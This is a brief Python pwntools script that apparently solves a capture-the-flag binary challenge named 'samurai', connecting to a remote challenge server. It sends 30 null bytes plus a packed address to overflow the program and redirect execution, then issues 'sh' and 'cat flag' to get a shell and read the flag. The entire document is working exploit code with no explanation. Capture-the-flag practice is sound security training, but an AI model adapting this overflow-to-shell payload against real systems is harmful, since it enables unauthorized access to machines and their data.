from pwn import*

p = remote("pwn.chall.pwnoh.io", 13371)
#p = process("./samurai")
#gdb.attach(p, api=True)

payload = b"\x00"*30 + p64(0x4774cc) 
p.sendline(payload)
p.sendline('sh')
p.sendline('cat flag')

p.interactive()
